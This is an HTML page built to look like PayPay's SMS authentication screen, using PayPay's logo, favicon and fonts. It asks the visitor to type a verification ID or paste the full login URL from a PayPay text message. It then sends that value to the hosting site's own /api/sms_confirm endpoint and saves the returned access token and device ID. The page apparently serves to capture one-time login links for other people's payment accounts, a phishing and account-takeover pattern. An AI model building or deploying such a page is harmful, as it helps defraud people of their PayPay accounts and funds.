<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width,height=device-height,user-scalable=no,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,viewport-fit=cover">
  <title>PayPay - SMS認証</title>
  <link rel="icon" href="https://cdn.assets.paypay.ne.jp/cdn/apps/prod/web/5-72-0/favicon.ico">
  <style>
    @font-face{font-family:Graphik;font-display:swap;font-weight:300;src:url(https://static.paypay.ne.jp/font/Graphik-Regular-Web.woff2)format("woff2"),url(https://static.paypay.ne.jp/font/Graphik-Regular-Web.woff)format("woff")}
    @font-face{font-family:Graphik;font-display:swap;font-weight:400;src:url(https://static.paypay.ne.jp/font/Graphik-Regular-Web.woff2)format("woff2"),url(https://static.paypay.ne.jp/font/Graphik-Regular-Web.woff)format("woff")}
    @font-face{font-family:Graphik;font-display:swap;font-weight:600;src:url(https://static.paypay.ne.jp/font/Graphik-Semibold-Web.woff2)format("woff2"),url(https://static.paypay.ne.jp/font/Graphik-Semibold-Web.woff)format("woff")}
    @font-face{font-family:Graphik;font-display:swap;font-weight:700;src:url(https://static.paypay.ne.jp/font/Graphik-Semibold-Web.woff2)format("woff2"),url(https://static.paypay.ne.jp/font/Graphik-Semibold-Web.woff)format("woff")}

    *, *::before, *::after { box-sizing: border-box; }
    html, body {
      margin: 0; padding: 0;
      font-family: Graphik, "Hiragino Sans", "Hiragino Kaku Gothic ProN", "Noto Sans", "Noto Sans CJK JP", "Noto Sans JP", Meiryo, sans-serif;
      -webkit-user-select: none; user-select: none;
      -webkit-touch-callout: none;
      font-size: 12px;
      background-color: #fff;
    }
    body {
      min-height: 100vh;
      padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
    }
    a { color: #3895ff; text-decoration: none; }
    button { border: 0; outline: 0; cursor: pointer; font-family: inherit; }

    .container { max-width: 100vw; margin: 0 auto; }

    .top-header { position: relative; }
    .account-header { z-index: 100; background: #fff; width: 100%; position: fixed; top: 0; }
    .header-signin {
      border: 0; border-bottom: 4px solid;
      flex-direction: row; flex: 1;
      justify-content: space-between; align-items: center;
      padding: 8px 12px; display: flex;
      color: #3895ff;
      border-image: linear-gradient(90deg, #6fcaec, rgba(109,213,237,0.7)) 1;
      box-shadow: 0 15px 20px -20px #6fcaec;
    }
    .header-signin img { height: 45px; display: block; }
    .header-signin h2 { font-size: 26px; font-weight: 400; margin: 0; line-height: 1.2; }

    .account-content {
      padding-top: 80px;
      -webkit-overflow-scrolling: touch;
      position: relative;
    }
    .sms-page {
      max-width: 440px; margin-left: auto; margin-right: auto; padding: 30px 20px;
    }

    .sms-description {
      text-align: center;
      margin-bottom: 32px;
    }
    .sms-description .sms-icon {
      width: 64px; height: 64px; margin: 0 auto 16px;
    }
    .sms-description h3 {
      color: #242424; font-size: 18px; font-weight: 600; margin: 0 0 12px;
      line-height: 1.4;
    }
    .sms-description p {
      color: #686868; font-size: 13px; line-height: 1.8; margin: 0;
      -webkit-user-select: text; user-select: text;
    }
    .sms-description .phone-hint {
      color: #242424; font-weight: 600;
    }

    .otp-container {
      display: flex;
      justify-content: center;
      gap: 8px;
      margin-bottom: 24px;
    }
    .otp-box {
      width: 44px; height: 52px;
      border: none; border-bottom: 2px solid #ccc; border-radius: 0;
      text-align: center; font-size: 24px; font-weight: 600; color: #242424;
      background: transparent; outline: none;
      font-family: inherit;
      -webkit-user-select: text; user-select: text;
      caret-color: #3895ff;
      transition: border-color 0.2s;
    }
    .otp-box:focus { border-bottom-color: #3895ff; }
    .otp-box.filled { border-bottom-color: #242424; }

    .or-divider {
      display: flex; align-items: center; gap: 12px;
      margin: 0 0 20px;
      color: #bababa; font-size: 12px;
    }
    .or-divider::before, .or-divider::after {
      content: ""; flex: 1; height: 1px; background: #e6e6e6;
    }

    .url-input-wrapper { display: none; margin-bottom: 20px; }
    .url-input-wrapper.visible { display: block; }
    .url-field {
      width: 100%; border: none; border-bottom: 1px solid #ccc; border-radius: 0;
      padding: 8px 0; font-size: 14px; color: #686868; outline: none;
      background: transparent; font-family: inherit;
      -webkit-user-select: text; user-select: text;
      transition: border-color 0.2s;
    }
    .url-field:focus { border-bottom-color: #3895ff; }
    .url-toggle {
      background: none; color: #3895ff; font-size: 13px; font-weight: 600;
      padding: 0; margin-bottom: 8px; display: block; width: 100%; text-align: center;
      cursor: pointer; border: none;
    }

    .submit-button {
      color: #fff; background-color: #3895ff; border: none; border-radius: 4px;
      width: 100%; height: 45px; font-size: 14px;
      text-align: center; cursor: pointer; outline: none; font-weight: 600;
      font-family: inherit; margin-top: 8px;
    }
    .submit-button:disabled { background-color: #e6e6e6; cursor: default; }

    .resend-row {
      text-align: center; margin-top: 24px; font-size: 13px; color: #686868;
    }
    .resend-row a { color: #3895ff; font-weight: 600; }

    .error-msg {
      display: none; color: #e53935; font-size: 13px;
      text-align: center; margin-top: 12px; line-height: 1.5;
    }
    .error-msg.visible { display: block; }

    .loading-overlay {
      display: none; position: fixed; inset: 0;
      background: rgba(255,255,255,0.85); z-index: 9999;
      flex-direction: column; align-items: center; justify-content: center;
      gap: 16px;
    }
    .loading-overlay.visible { display: flex; }
    .spinner {
      width: 36px; height: 36px;
      border: 3px solid #e6e6e6; border-top-color: #3895ff;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .loading-text { color: #686868; font-size: 13px; }
  </style>
</head>
<body class="ios outside-native account-sign-in">

<div id="app" data-v-app="">
  <div id="app" style="--font-weight-bold: var(--font-weight-bold-ios); --RootPortal-zIndex: 1100;">
    <div class="container">
      <section data-v-32bf0b5d="" class="account-root-page">

        <section data-v-b035e588="" data-v-32bf0b5d="" class="top-header account-header">
          <header data-v-b035e588="" class="header-signin">
            <img data-v-b035e588="" src="https://image.paypay.ne.jp/images/payment-miniapps/opa/logo.png" alt="PayPay" height="45">
            <h2 data-v-b035e588="">SMS認証</h2>
          </header>
        </section>

        <div data-v-32bf0b5d="" class="account-content">
          <section class="sms-page">

            <div class="sms-description">
              <svg class="sms-icon" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="4" y="14" width="56" height="40" rx="6" fill="#e8f4fd" stroke="#3895ff" stroke-width="2"/>
                <polyline points="4,14 32,38 60,14" stroke="#3895ff" stroke-width="2" fill="none" stroke-linejoin="round"/>
                <circle cx="48" cy="46" r="11" fill="#3895ff"/>
                <path d="M44 46l3 3 5-5" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
              </svg>

              <h3>SMS認証コードを入力</h3>
              <p>登録済みの携帯電話番号に<br>認証用SMSを送信しました。<br>URLに含まれる<span class="phone-hint">認証ID</span>を入力してください。<br><small style="color:#bababa;">例：TK4602 またはURL全体をそのまま貼り付けてもOKです</small></p>
            </div>

            <div class="otp-container" id="otpContainer">
              <input class="otp-box" type="text" maxlength="1" inputmode="text" autocomplete="one-time-code" data-index="0">
              <input class="otp-box" type="text" maxlength="1" inputmode="text" data-index="1">
              <input class="otp-box" type="text" maxlength="1" inputmode="text" data-index="2">
              <input class="otp-box" type="text" maxlength="1" inputmode="text" data-index="3">
              <input class="otp-box" type="text" maxlength="1" inputmode="text" data-index="4">
              <input class="otp-box" type="text" maxlength="1" inputmode="text" data-index="5">
            </div>

            <div class="or-divider">またはURLで入力</div>
            <div class="url-input-wrapper" id="urlWrapper">
              <input id="urlInput" class="url-field" type="url" placeholder="https://www.paypay.ne.jp/portal/oauth2/l?id=..." autocomplete="off">
            </div>
            <button class="url-toggle" id="urlToggle" type="button">URLをそのまま貼り付ける</button>

            <button id="submitBtn" class="submit-button" disabled>認証する</button>

            <div class="error-msg" id="errorMsg"></div>

            <div class="resend-row">
              SMSが届かない場合 &nbsp;
              <a href="signin.html">最初からやり直す</a>
            </div>

          </section>
        </div>

      </section>
    </div>
  </div>
</div>

<div class="loading-overlay" id="loadingOverlay">
  <div class="spinner"></div>
  <div class="loading-text">認証中...</div>
</div>

<script>
(function () {
  const boxes   = Array.from(document.querySelectorAll(".otp-box"));
  const urlWrap = document.getElementById("urlWrapper");
  const urlInput= document.getElementById("urlInput");
  const urlToggle = document.getElementById("urlToggle");
  const submitBtn = document.getElementById("submitBtn");
  const errorMsg  = document.getElementById("errorMsg");
  const overlay   = document.getElementById("loadingOverlay");

  let useUrl = false;

  function getOtpValue() {
    return boxes.map(b => b.value).join("");
  }

  function updateSubmitState() {
    if (useUrl) {
      submitBtn.disabled = urlInput.value.trim().length === 0;
    } else {
      submitBtn.disabled = getOtpValue().trim().length === 0;
    }
  }

  boxes.forEach((box, i) => {
    box.addEventListener("input", () => {
      const val = box.value.replace(/\s/g, "");
      box.value = val.slice(-1);
      box.classList.toggle("filled", box.value.length > 0);
      if (box.value && i < boxes.length - 1) {
        boxes[i + 1].focus();
      }
      updateSubmitState();
    });

    box.addEventListener("keydown", e => {
      if (e.key === "Backspace" && !box.value && i > 0) {
        boxes[i - 1].focus();
        boxes[i - 1].value = "";
        boxes[i - 1].classList.remove("filled");
        updateSubmitState();
      }
    });

    box.addEventListener("paste", e => {
      e.preventDefault();
      const text = (e.clipboardData || window.clipboardData).getData("text").trim();
      if (text.startsWith("http")) {
        switchToUrl(text);
        return;
      }
      const chars = text.replace(/\s/g, "").split("");
      boxes.forEach((b, idx) => {
        b.value = chars[idx] || "";
        b.classList.toggle("filled", b.value.length > 0);
      });
      const last = Math.min(chars.length, boxes.length - 1);
      boxes[last].focus();
      updateSubmitState();
    });
  });

  function switchToUrl(prefill) {
    useUrl = true;
    urlWrap.classList.add("visible");
    urlToggle.style.display = "none";
    document.getElementById("otpContainer").style.opacity = "0.3";
    document.getElementById("otpContainer").style.pointerEvents = "none";
    if (prefill) urlInput.value = prefill;
    urlInput.focus();
    updateSubmitState();
  }

  urlToggle.addEventListener("click", () => switchToUrl(""));
  urlInput.addEventListener("input", updateSubmitState);

  function showError(msg) {
    errorMsg.textContent = msg;
    errorMsg.classList.add("visible");
  }
  function clearError() {
    errorMsg.textContent = "";
    errorMsg.classList.remove("visible");
  }

  submitBtn.addEventListener("click", async () => {
    clearError();
    const code = useUrl ? urlInput.value.trim() : getOtpValue().trim();
    if (!code) return;

    overlay.classList.add("visible");
    submitBtn.disabled = true;

    try {
      const res = await fetch("/api/sms_confirm", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ code }),
      });
      const data = await res.json();

      if (!res.ok) {
        showError(data.error || "認証に失敗しました。もう一度お試しください。");
        submitBtn.disabled = false;
        return;
      }

      if (data.access_token) {
        sessionStorage.setItem("paypay_access_token", data.access_token);
      }
      if (data.device_uuid) {
        sessionStorage.setItem("paypay_device_uuid", data.device_uuid);
      }

      window.location.href = "index.html";

    } catch (err) {
      showError("通信エラーが発生しました。再度お試しください。");
      submitBtn.disabled = false;
    } finally {
      overlay.classList.remove("visible");
    }
  });

  boxes[0].focus();
})();
</script>
</body>
</html>
